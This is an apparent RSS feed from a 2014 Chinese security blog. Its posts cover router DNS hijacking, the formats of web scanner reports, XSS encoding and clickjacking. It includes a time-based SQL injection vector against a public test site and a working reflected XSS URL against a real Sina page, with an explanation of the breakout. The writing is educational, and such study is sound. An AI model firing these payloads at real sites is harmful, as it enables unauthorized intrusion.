<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
        <title>normal world</title>
        <description>normal world - litsand</description>
        <link>http://username.github.io</link>
        <link>http://username.github.io</link>
        <lastBuildDate>2014-02-13T21:13:44+08:00</lastBuildDate>
        <pubDate>2014-02-13T21:13:44+08:00</pubDate>
        <ttl>1800</ttl>


        <item>
                <title>CERT POLSKA detected large scale DNS hacking on home routers</title>
                <description>&lt;p&gt;波兰计算机应急中心检测到大量家用路由器的DNS配置被修改。黑客对大量网上银行的用户实施了中间人攻击。&lt;/p&gt;

&lt;p&gt;波兰CERT在&lt;a href='https://www.cert.pl/news/8019/langswitch_lang/en'&gt;公告&lt;/a&gt;中写到: ”很多家用路由器存在未授权的远程修改配置漏洞导致了这次事件。这次中间人攻击中，黑客在多个网上银行的页面中注入了恶意的javascript代码欺骗用户输入账号密码和交易确认码。最后窃取了用户银行里的钱“ 攻击的流程原理可用下图表示：&lt;/p&gt;

&lt;p&gt;！&lt;a href='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/dnspolar2.png'&gt;pic&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;为了绕过HTTPS，黑客采用了SSL剥离的技术。攻击者阻止用户和银行之间建立SSL连接，使用户和代理服务器之间使用未加密的http通信。&lt;/p&gt;

&lt;p&gt;唯一不同的是浏览器会提醒用户连接没有使用SSL加密。攻击者为了迷惑用户，重写了url，在域名前加了个“ssl-.&amp;#8221;的前缀。当然这个域名是不存在的，只能在黑客的恶意DNS才能解析。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/dnsploar.png' /&gt;&lt;/p&gt;

&lt;p&gt;更多关于SSL stripping的技术可以参考&lt;a href='http://www.freebuf.com/articles/web/5929.html'&gt;利用sslstrip和ettercap突破ssl嗅探密码&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;根据波兰IT安全组织Niebezpiecznik.pl的调查，攻击者很可能利用的是ZyNOS路由器固件的漏洞，利用这个漏洞，攻击者可以未授权的情况下下载到路由器的配置信息，从而获取路由器的登陆密码。&lt;/p&gt;

&lt;p&gt;波兰CERT的负责人Przemyslaw Jaroszewski提到，修改家用路由器的DNS记录有很多方法，有些已经存在很多年了。这次让我们吃惊的是第一次有如此大规模的，目的是窃取金钱的利用。这种针对网上银行用户的DNS劫持也许会越来越多。&lt;/p&gt;

&lt;p&gt;防御的建议是家用路由器不要开启任何的远程管理功能，不要使用默认的管理密码。去年国内也曾爆发过一次大规模的家用路由器DNS劫持攻击。相关的技术和防御方法可以参考&lt;a href='http://www.freebuf.com/articles/web/9723.html'&gt;说说“史上最大规模的DNS劫持”&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2014/02/11/cert-polska-detected-large-scale-dns-hacking-on-home-routers</link>
                <guid>http://username.github.io/2014/02/11/cert-polska-detected-large-scale-dns-hacking-on-home-routers</guid>
                <pubDate>2014-02-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>web扫描器扫描报告分析</title>
                <description>&lt;h1 id='id2686'&gt;测试网站&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://demo.aisec.cn/demo/'&gt;http://demo.aisec.cn/demo/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://demo.testfire.net/'&gt;appscan测试站&lt;/a&gt;&lt;/p&gt;

&lt;h1 id='netsparker_2300'&gt;netsparker 2.3.0.0&lt;/h1&gt;

&lt;h2 id='id2687'&gt;报告类型&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;comparison report 报告比较&lt;/li&gt;

&lt;li&gt;crawled urls list csv 爬虫抓取的url列表&lt;/li&gt;

&lt;li&gt;detailed scan report 详细的扫描报告&lt;/li&gt;

&lt;li&gt;scaned urls list csv 扫描的url列表&lt;/li&gt;

&lt;li&gt;vulnerabilities list csv 漏洞列表csv&lt;/li&gt;

&lt;li&gt;vulnerabilities list xml 漏洞列表xml&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id='xml'&gt;xml报告样例&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot; ?&amp;gt;
&amp;lt;?xml-stylesheet href=&amp;quot;vulnerabilities-list.xsl&amp;quot; type=&amp;quot;text/xsl&amp;quot; ?&amp;gt;
&amp;lt;netsparker generated=&amp;quot;2014-2-10 10:28:46&amp;quot;&amp;gt;
	&amp;lt;target&amp;gt;
		&amp;lt;url&amp;gt;http://testphp.vulnweb.com/&amp;lt;/url&amp;gt;
		&amp;lt;scantime&amp;gt;1820&amp;lt;/scantime&amp;gt;
	&amp;lt;/target&amp;gt;
	&amp;lt;vulnerability confirmed=&amp;quot;True&amp;quot;&amp;gt;
		&amp;lt;url&amp;gt;http://testphp.vulnweb.com/search.php?test=&amp;amp;apos;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&amp;amp;apos;&amp;lt;/url&amp;gt;
		&amp;lt;type&amp;gt;ConfirmedBlindSqlInjection&amp;lt;/type&amp;gt;
		&amp;lt;severity&amp;gt;Critical&amp;lt;/severity&amp;gt;
		&amp;lt;certainty&amp;gt;100&amp;lt;/certainty&amp;gt;
		
		&amp;lt;vulnerableparametertype&amp;gt;GET&amp;lt;/vulnerableparametertype&amp;gt;
		&amp;lt;vulnerableparameter&amp;gt;test&amp;lt;/vulnerableparameter&amp;gt;
		&amp;lt;vulnerableparametervalue&amp;gt;&amp;amp;apos;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&amp;amp;apos;&amp;lt;/vulnerableparametervalue&amp;gt;

		&amp;lt;rawrequest&amp;gt;&amp;lt;![CDATA[POST /search.php?test=&amp;#39;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&amp;#39; HTTP/1.1
Referer: http://testphp.vulnweb.com/
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
oButton=go&amp;amp;searchFor=3&amp;amp;
]]&amp;gt;&amp;lt;/rawrequest&amp;gt;
		&amp;lt;rawresponse&amp;gt;&amp;lt;![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Sun, 09 Feb 2014 11:51:01 GMT
]]&amp;gt;&amp;lt;/rawresponse&amp;gt;
	
	&amp;lt;extrainformation&amp;gt;
	&amp;lt;/extrainformation&amp;gt;


	&amp;lt;classification&amp;gt;
		&amp;lt;OWASP&amp;gt;A1&amp;lt;/OWASP&amp;gt;
		&amp;lt;WASC&amp;gt;19&amp;lt;/WASC&amp;gt;
		&amp;lt;CWE&amp;gt;89&amp;lt;/CWE&amp;gt;
		&amp;lt;CAPEC&amp;gt;66&amp;lt;/CAPEC&amp;gt;
		&amp;lt;PCI&amp;gt;6.5.2&amp;lt;/PCI&amp;gt;
		&amp;lt;PCI2&amp;gt;6.5.1&amp;lt;/PCI2&amp;gt;
	&amp;lt;/classification&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;判断报告来源可以根据&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;netsparker generated=&amp;quot;2014-2-10 10:28:46&amp;quot;&amp;gt;

，关于扫描任务的信息只有报告产生的时间，花费时间，扫描目标，没有具体的扫描开始时间，等信息。一个漏洞是一个vulnerability节点，url节点&amp;lt;url&amp;gt;http://testphp.vulnweb.com/search.php?test=&amp;amp;apos;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&amp;amp;apos;&amp;lt;/url&amp;gt; 包含了参数以及测试使用的vector。提供了漏洞的GET/POST方法和具体的参数。此外classification字段比较详细。&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='awvs_version_80_build_20130205'&gt;awvs Version 8.0 Build 20130205&lt;/h1&gt;

&lt;p&gt;file菜单里可以到处扫描结果。action菜单里可以到处avdl等多种格式的xml。&lt;/p&gt;

&lt;p&gt;只能根据xml结构或者请求的一些字段来判断是属于awvs的报告。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;ScanGroup ExportedOn=&amp;quot;10-2-2014, 14:17&amp;quot;&amp;gt;
 &amp;lt;Scan&amp;gt;
  &amp;lt;Name&amp;gt;&amp;lt;![CDATA[Scan Thread 1 ( http://testphp.vulnweb.com/ )]]&amp;gt;&amp;lt;/Name&amp;gt;
  &amp;lt;ShortName&amp;gt;&amp;lt;![CDATA[Scan Thread 1]]&amp;gt;&amp;lt;/ShortName&amp;gt;
  &amp;lt;StartURL&amp;gt;&amp;lt;![CDATA[http://testphp.vulnweb.com/]]&amp;gt;&amp;lt;/StartURL&amp;gt;
  &amp;lt;StartTime&amp;gt;&amp;lt;![CDATA[10/2/2014, 13:44:14]]&amp;gt;&amp;lt;/StartTime&amp;gt;
  &amp;lt;FinishTime&amp;gt;&amp;lt;![CDATA[10/2/2014, 14:05:00]]&amp;gt;&amp;lt;/FinishTime&amp;gt;
  &amp;lt;ScanTime&amp;gt;&amp;lt;![CDATA[20 minutes, 47 seconds]]&amp;gt;&amp;lt;/ScanTime&amp;gt;
  &amp;lt;Aborted&amp;gt;&amp;lt;![CDATA[False]]&amp;gt;&amp;lt;/Aborted&amp;gt;
  &amp;lt;Responsive&amp;gt;&amp;lt;![CDATA[True]]&amp;gt;&amp;lt;/Responsive&amp;gt;
  &amp;lt;Banner&amp;gt;&amp;lt;![CDATA[nginx/1.4.1]]&amp;gt;&amp;lt;/Banner&amp;gt;
  &amp;lt;Os&amp;gt;&amp;lt;![CDATA[Unknown]]&amp;gt;&amp;lt;/Os&amp;gt;
  &amp;lt;WebServer&amp;gt;&amp;lt;![CDATA[nginx]]&amp;gt;&amp;lt;/WebServer&amp;gt;
  &amp;lt;Technologies&amp;gt;&amp;lt;![CDATA[PHP]]&amp;gt;&amp;lt;/Technologies&amp;gt;
  &amp;lt;Crawler StartUrl=&amp;quot;http://testphp.vulnweb.com/&amp;quot;&amp;gt;
   &amp;lt;LoginSequence&amp;gt;
   &amp;lt;/LoginSequence&amp;gt;
   &amp;lt;Cookies&amp;gt;
     &amp;lt;Variable Name=&amp;quot;login&amp;quot; Type=&amp;quot;Cookie&amp;quot;&amp;gt;
     &amp;lt;/Variable&amp;gt;
     &amp;lt;Variable Name=&amp;quot;mycookie&amp;quot; Type=&amp;quot;Cookie&amp;quot;&amp;gt;
     &amp;lt;/Variable&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提供了任务的开始结束时间花费时间。一条漏洞是一个reportitem节点。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      &amp;lt;ReportItem id=&amp;quot;71&amp;quot; color=&amp;quot;red&amp;quot;&amp;gt;
       &amp;lt;Name&amp;gt;&amp;lt;![CDATA[SQL injection (verified)]]&amp;gt;&amp;lt;/Name&amp;gt;
       &amp;lt;ModuleName&amp;gt;&amp;lt;![CDATA[Scripting (Sql_Injection.script)]]&amp;gt;&amp;lt;/ModuleName&amp;gt;
       &amp;lt;Details&amp;gt;&amp;lt;![CDATA[URL encoded GET input &amp;lt;b&amp;gt;&amp;lt;font color=&amp;quot;dark&amp;quot;&amp;gt;test&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt; was set to &amp;lt;b&amp;gt;&amp;lt;font color=&amp;quot;dark&amp;quot;&amp;gt;1ACUSTART&amp;#39;&amp;amp;quot;1uOo3ACUEND&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;]]&amp;gt;&amp;lt;/Details&amp;gt;
       &amp;lt;Affects&amp;gt;&amp;lt;![CDATA[/search.php]]&amp;gt;&amp;lt;/Affects&amp;gt;
       &amp;lt;Parameter&amp;gt;&amp;lt;![CDATA[test]]&amp;gt;&amp;lt;/Parameter&amp;gt;
       &amp;lt;AOP_SourceFile&amp;gt;&amp;lt;![CDATA[/hj/var/www//search.php]]&amp;gt;&amp;lt;/AOP_SourceFile&amp;gt;
       &amp;lt;AOP_SourceLine&amp;gt;60&amp;lt;/AOP_SourceLine&amp;gt;
       &amp;lt;AOP_Additional&amp;gt;&amp;lt;![CDATA[SQL query: SELECT * FROM guestbook WHERE sender=&amp;#39;1ACUSTART&amp;#39;&amp;amp;quot;1uOo3ACUEND&amp;#39;;
&amp;amp;quot;mysql_query&amp;amp;quot; was called.]]&amp;gt;&amp;lt;/AOP_Additional&amp;gt;
       &amp;lt;IsFalsePositive&amp;gt;&amp;lt;![CDATA[False]]&amp;gt;&amp;lt;/IsFalsePositive&amp;gt;
       &amp;lt;Severity&amp;gt;&amp;lt;![CDATA[high]]&amp;gt;&amp;lt;/Severity&amp;gt;
       &amp;lt;Type&amp;gt;&amp;lt;![CDATA[Validation]]&amp;gt;&amp;lt;/Type&amp;gt;
       &amp;lt;Impact&amp;gt;&amp;lt;![CDATA[An .]]&amp;gt;&amp;lt;/Impact&amp;gt;
       &amp;lt;Description&amp;gt;&amp;lt;![CDATA[This script is possibly vulnerable to SQL Injection attacks.&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
]]&amp;gt;&amp;lt;/Description&amp;gt;
       &amp;lt;DetailedInformation&amp;gt;&amp;lt;![CDATA[&amp;lt;i&amp;gt;.]]&amp;gt;&amp;lt;/Recommendation&amp;gt;
       &amp;lt;TechnicalDetails&amp;gt;
        &amp;lt;Request&amp;gt;&amp;lt;![CDATA[POST /search.php?test=1ACUSTART&amp;#39;%221uOo3ACUEND HTTP/1.1

goButton=go&amp;amp;amp;searchFor=1]]&amp;gt;&amp;lt;/Request&amp;gt;
        &amp;lt;Response&amp;gt;&amp;lt;![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 10 Feb 2014 05:48:24 GM
]]&amp;gt;&amp;lt;/Response&amp;gt;
       &amp;lt;/TechnicalDetails&amp;gt;
       &amp;lt;References&amp;gt;
        &amp;lt;Reference&amp;gt;
          &amp;lt;Database&amp;gt;&amp;lt;![CDATA[Acunetix SQL Injection Attack]]&amp;gt;&amp;lt;/Database&amp;gt;
          &amp;lt;URL&amp;gt;&amp;lt;![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]&amp;gt;&amp;lt;/URL&amp;gt;
        &amp;lt;/Reference&amp;gt;
        &amp;lt;Reference&amp;gt;
          &amp;lt;Database&amp;gt;&amp;lt;![CDATA[VIDEO: SQL Injection tutorial]]&amp;gt;&amp;lt;/Database&amp;gt;
          &amp;lt;URL&amp;gt;&amp;lt;![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]&amp;gt;&amp;lt;/URL&amp;gt;
        &amp;lt;/Reference&amp;gt;
        
       &amp;lt;/References&amp;gt;
      &amp;lt;/ReportItem&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;url提供的是相对值&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;Affects&amp;gt;&amp;lt;![CDATA[/search.php]]&amp;gt;&amp;lt;/Affects&amp;gt;，url中没有包含参数，&amp;lt;Parameter&amp;gt;&amp;lt;![CDATA[test]]&amp;gt;&amp;lt;/Parameter&amp;gt;，提供了参数，没说指明是get还是post方法。&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='avws__wvs_reporter'&gt;avws 的报告模块 wvs reporter&lt;/h2&gt;

&lt;p&gt;可以生成多种形式组合分类的报告。包括affected items,developer report ,executive sumary,quick report,compliance report, monthly vulnerabilities.&lt;/p&gt;

&lt;h1 id='appscan_80'&gt;appscan 8.0&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;
&amp;lt;XmlReport Name=&amp;quot;testphp&amp;quot; XmlExportVersion=&amp;quot;2.0&amp;quot;&amp;gt;
  &amp;lt;AppScanInfo&amp;gt;
    &amp;lt;Version&amp;gt;8.0.0.491&amp;lt;/Version&amp;gt;
    &amp;lt;ServicePack /&amp;gt;
  &amp;lt;/AppScanInfo&amp;gt;
  &amp;lt;Summary&amp;gt;
    &amp;lt;TotalIssues&amp;gt;81&amp;lt;/TotalIssues&amp;gt;
    &amp;lt;TotalVariants&amp;gt;275&amp;lt;/TotalVariants&amp;gt;
    &amp;lt;TotalRemediations&amp;gt;57&amp;lt;/TotalRemediations&amp;gt;
    &amp;lt;TotalScanDuration&amp;gt;02:16:08.0227903&amp;lt;/TotalScanDuration&amp;gt;
    &amp;lt;Hosts&amp;gt;
      &amp;lt;Host Name=&amp;quot;http://testphp.vulnweb.com/&amp;quot;&amp;gt;
        &amp;lt;TotalInformationalIssues&amp;gt;20&amp;lt;/TotalInformationalIssues&amp;gt;
        &amp;lt;TotalLowSeverityIssues&amp;gt;7&amp;lt;/TotalLowSeverityIssues&amp;gt;
        &amp;lt;TotalMediumSeverityIssues&amp;gt;29&amp;lt;/TotalMediumSeverityIssues&amp;gt;
        &amp;lt;TotalHighSeverityIssues&amp;gt;25&amp;lt;/TotalHighSeverityIssues&amp;gt;
        &amp;lt;Total&amp;gt;81&amp;lt;/Total&amp;gt;
      &amp;lt;/Host&amp;gt;
    &amp;lt;/Hosts&amp;gt;
  &amp;lt;/Summary&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以根据appscaninfo来判断来自于appscan的扫描报告。提供了appscan的版本，总的漏洞数量概要，花费的时间等信息。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;Issue IssueTypeID=&amp;quot;attBlindSqlInjectionStrings&amp;quot; Noise=&amp;quot;False&amp;quot;&amp;gt;
        &amp;lt;Url&amp;gt;http://testphp.vulnweb.com/product.php&amp;lt;/Url&amp;gt;
        &amp;lt;Severity&amp;gt;High&amp;lt;/Severity&amp;gt;
        &amp;lt;Entity Name=&amp;quot;pic&amp;quot; Type=&amp;quot;Parameter&amp;quot; /&amp;gt;
        &amp;lt;Variant ID=&amp;quot;16471&amp;quot;&amp;gt;
          &amp;lt;Comments /&amp;gt;
          &amp;lt;Difference&amp;gt;parameter:  pic=6 -&amp;amp;gt; pic=0%2B0%2B0%2B1&amp;lt;/Difference&amp;gt;
          &amp;lt;Reasoning&amp;gt;此测试会将条件选项附加到参数值后面，以验证其是否嵌入到后端的 SQL 查询中。已发送三（或四）个测试请求：最后一个在逻辑上等同于原始请求，并且倒数第二个请求是不同的（其他请求用于控制用途）。最后两个测试响应与原始测试响应的比较可确认附加的值确实已添加到了 SQL 查询中。&amp;lt;/Reasoning&amp;gt;
          &amp;lt;AdditionalData /&amp;gt;
          &amp;lt;CWE&amp;gt;89&amp;lt;/CWE&amp;gt;
          &amp;lt;ValidationDataLocationAtTestResponse /&amp;gt;
          &amp;lt;OriginalHttpTraffic&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;url中没有包含参数。参数使用&lt;Entity Name='pic' Type='Parameter' /&gt; 给出，不知道有木有其他的entity&lt;/p&gt;

&lt;p&gt;appscan的报告模块也是可以灵活的生成各种类型的报告，还可以进行增量分析。&lt;/p&gt;

&lt;h1 id='burpsuipt_pro_1401'&gt;burpsuipt pro 1.4.01&lt;/h1&gt;

&lt;h2 id='id2688'&gt;报告类型&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;screen-friendly html&lt;/li&gt;

&lt;li&gt;printer-friendly html with hyperlinks&lt;/li&gt;

&lt;li&gt;printer-friendly html without hyperlinks&lt;/li&gt;

&lt;li&gt;xml&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;任务信息包含burpversion版本和报告导出时间&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;issues burpVersion=&amp;quot;1.4.01&amp;quot; exportTime=&amp;quot;Tue Feb 11 13:53:29 CST 2014&amp;quot;&amp;gt;

&amp;lt;issue&amp;gt;
    &amp;lt;serialNumber&amp;gt;3864621949007657984&amp;lt;/serialNumber&amp;gt;
    &amp;lt;type&amp;gt;1049088&amp;lt;/type&amp;gt;
    &amp;lt;name&amp;gt;SQL injection&amp;lt;/name&amp;gt;
    &amp;lt;host ip=&amp;quot;176.28.50.165&amp;quot;&amp;gt;http://testphp.vulnweb.com&amp;lt;/host&amp;gt;
    &amp;lt;path&amp;gt;&amp;lt;![CDATA[/artists.php]]&amp;gt;&amp;lt;/path&amp;gt;
    &amp;lt;location&amp;gt;&amp;lt;![CDATA[/artists.php [artist parameter]]]&amp;gt;&amp;lt;/location&amp;gt;
    &amp;lt;severity&amp;gt;High&amp;lt;/severity&amp;gt;
    &amp;lt;confidence&amp;gt;Tentative&amp;lt;/confidence&amp;gt;&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2014/02/09/web</link>
                <guid>http://username.github.io/2014/02/09/web</guid>
                <pubDate>2014-02-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>7层DDOS  屏蔽应用层洪水攻击</title>
                <description></description>
                <link>http://username.github.io/2014/02/09/7ddos--</link>
                <guid>http://username.github.io/2014/02/09/7ddos--</guid>
                <pubDate>2014-02-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>xss输出点的安全编码</title>
                <description>&lt;h1 id='html'&gt;输出在html标签之间&lt;/h1&gt;

&lt;p&gt;只要进行html entity编码即可&lt;/p&gt;

&lt;p&gt;html entity&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;     –&amp;gt;     &amp;amp;amp;
&amp;lt;     –&amp;gt;     &amp;amp;lt;
&amp;gt;     –&amp;gt;     &amp;amp;gt;
”     –&amp;gt;     &amp;amp;quot;
‘     –&amp;gt;     &amp;amp;#x27;
/     –&amp;gt;     &amp;amp;#x2f;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;无法执行script的标签。 &lt;title /&gt; &lt;textarea /&gt; &lt;xmp /&gt; &lt;iframe /&gt; &lt;noscript /&gt; &lt;plaintext /&gt;&lt;/p&gt;

&lt;h1 id='html'&gt;输出在普通的html标签属性&lt;/h1&gt;

&lt;p&gt;除了字母数字都做html entity编码，属性值用双引号包裹。不然一个空格就可以闭合当前属性。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;%     *     +     ,     –     /     ;     &amp;lt;     =     &amp;gt;     ^     |     `(反单引号，IE会认为它是单引号)&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='id2685'&gt;输出在&lt;/h1&gt;</description>
                <link>http://username.github.io/2014/01/14/xss</link>
                <guid>http://username.github.io/2014/01/14/xss</guid>
                <pubDate>2014-01-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>escape xss chanlenge</title>
                <description>&lt;p&gt;http://escape.alf.nu&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/14/escape-xss-chanlenge</link>
                <guid>http://username.github.io/2014/01/14/escape-xss-chanlenge</guid>
                <pubDate>2014-01-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>新浪一个反射xss记录</title>
                <description>&lt;pre&gt;&lt;code&gt;http://vip.book.sina.com.cn/?p=book&amp;amp;s=search&amp;amp;a=index&amp;amp;keyword=%27%3Balert%2811%29%3B%2F%2F&amp;amp;type=4&amp;amp;pub=0&amp;amp;cate=&amp;amp;vip=0&amp;amp;status=0&amp;amp;order=&amp;amp;dpc=1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;keyword参数，搜索框&lt;/p&gt;

&lt;p&gt;查看一处输出在script函数里。经过测试，没有过滤单引号。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function statSearch(logArr) {
var d = new Date();
var uniqueKey = d.getTime().toString() + Math.floor(Math.random()*1000+1).toString();

var queryKey = &amp;#39;&amp;#39;;alert(11);//&amp;#39;;

var refererKey = &amp;#39;http://vip.book.sina.com.cn/?p=book&amp;amp;amp;amp;s=search&amp;amp;amp;amp;a=index&amp;amp;amp;amp;keyword=%27%3Balert%28%29%3B%2F%2F&amp;amp;amp;amp;type=4&amp;amp;amp;amp;pub=0&amp;amp;amp;amp;cate=&amp;amp;amp;amp;vip=0&amp;amp;amp;amp;status=0&amp;amp;amp;amp;order=&amp;amp;amp;amp;dpc=1&amp;#39;;
var log = [];&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过单引号闭合，然后用//注释掉后面的语句。&lt;/p&gt;

&lt;p&gt;截图留念：&lt;/p&gt;

&lt;p&gt;&lt;img alt='xss1' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/sina/xss1.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/14/dom-xss</link>
                <guid>http://username.github.io/2014/01/14/dom-xss</guid>
                <pubDate>2014-01-14T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>[科普]点击劫持</title>
                <description>&lt;p&gt;点击劫持是一种针对web应用的相对较新型的攻击方式。它是一种视觉欺骗，通过在一个页面上面叠加另外一个透明的目标页面来实现。当用户想要点击页面的时候，实际上却点击了透明的隐藏页面。我们最近发现这种技术越来越流行了。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/clickjacking2.png' /&gt;&lt;/p&gt;

&lt;p&gt;这张图里，用户看到的是做了一道算术题，但是它其实是添加了一个账号！&lt;/p&gt;

&lt;p&gt;点击劫持这个词是在2008年 Jeremiah Grossman 和Robert Hanson 在他们的研究报告中首先提出来的。几年过去了，点击劫持也有了各种各样的攻击方式。随着社交网络的普及，点击劫持的攻击数量也随之增多。&lt;/p&gt;

&lt;p&gt;一些常见的点击劫持的利用包括：&lt;/p&gt;

&lt;p&gt;1,欺骗用户打开摄像头和麦克风 2,让用户关注攻击者的微博 3,欺骗用户在社交网站上分享链接&lt;/p&gt;

&lt;h2 id='iframes'&gt;iFrames&lt;/h2&gt;

&lt;p&gt;iframe是一个html标签，它可以在一个网页上引入另外一个网页的内容。比如&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;p&amp;gt;这里嵌入了外部的网页&amp;lt;/p&amp;gt;
&amp;lt;iframe src=http://www.baidu.com width=900 height=900&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;打开之后如下，把freebuf主页嵌入了页面中。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/clickjacking1.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/08/</link>
                <guid>http://username.github.io/2014/01/</guid>
                <pubDate>2014-01-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>zsh配置使用</title>
                <description>&lt;h2 id='id2683'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;最早是在mactalk上看到的。中文能找到的资料不多。不过这几篇质量都很高。足够了。&lt;/p&gt;

&lt;p&gt;http://macshuo.com/?p=676&lt;/p&gt;

&lt;p&gt;http://lostjs.com/2012/09/27/zsh/&lt;/p&gt;

&lt;p&gt;http://leeiio.me/bash-to-zsh-for-mac/#&lt;/p&gt;

&lt;p&gt;https://github.com/robbyrussell/oh-my-zsh&lt;/p&gt;

&lt;h2 id='id2684'&gt;安装配置&lt;/h2&gt;

&lt;p&gt;基本的安装配置这些文章都说的比较明确，就不重复了。按照github上的说明来也行。autojump安装也方便。&lt;/p&gt;

&lt;p&gt;这次安装遇到的问题是自动纠错的功能没法默认没开。记得之前在12.04安装是可以的。看了下配置文件，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Uncomment following line if you want to disable command autocorrection
# DISABLE_CORRECTION=&amp;quot;true&amp;quot;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看这个意思应该是需要关闭自动纠错的话再打开这个开关。为什么没打开这个，还是没开启自动纠错呢。&lt;/p&gt;

&lt;p&gt;稍微搜了一下，资料太少。果断上github看issue，其实应该一开始就上github看，这种小众的东西，中文资料基本没多少。&lt;/p&gt;

&lt;p&gt;发现了这个issue&lt;/p&gt;

&lt;p&gt;https://github.com/robbyrussell/oh-my-zsh/issues/534&lt;/p&gt;

&lt;p&gt;很多人抱怨说是自动纠错就是个唐僧，太婆婆妈妈的了。所以现在自动纠错默认关闭了。但是配置文件还是旧的，没有修改。所以造成了这个困惑。果断提交个pull request。&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/07/zsh</link>
                <guid>http://username.github.io/2014/01/07/zsh</guid>
                <pubDate>2014-01-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu13.10</title>
                <description>&lt;h1 id='ubuntu1310'&gt;ubuntu13.10使用感受&lt;/h1&gt;

&lt;p&gt;&lt;a href='' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/06/ubuntu1310</link>
                <guid>http://username.github.io/2014/01/06/ubuntu1310</guid>
                <pubDate>2014-01-06T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>user based risk</title>
                <description>&lt;p&gt;人才是安全管理中最大的安全隐患。不记得这句话是谁说的了。不过我们经常会看到类似于从一个司机邮箱渗透到企业重要系统的案例（参考资料1），越来越热的apt攻击也选择人作为突破口。比如针对Google的极光攻击就是因为一个员工点击了聊天消息的链接从而导致被渗透的（参考资料2）。&lt;/p&gt;

&lt;p&gt;所以当防火墙配置恰当，数据已经加密，防病毒升级到最新，所有的措施都安排妥当之后，不要忘记人也是一个很大的风险来源。&lt;/p&gt;

&lt;p&gt;本文会先介绍企业员工可能导致的安全风险以及常用的防御方法。最后会从SIEM的角度尝试一种可能的解决方案。&lt;/p&gt;

&lt;h1 id='id2673'&gt;风险类型&lt;/h1&gt;

&lt;h2 id='id2674'&gt;社会工程学&lt;/h2&gt;

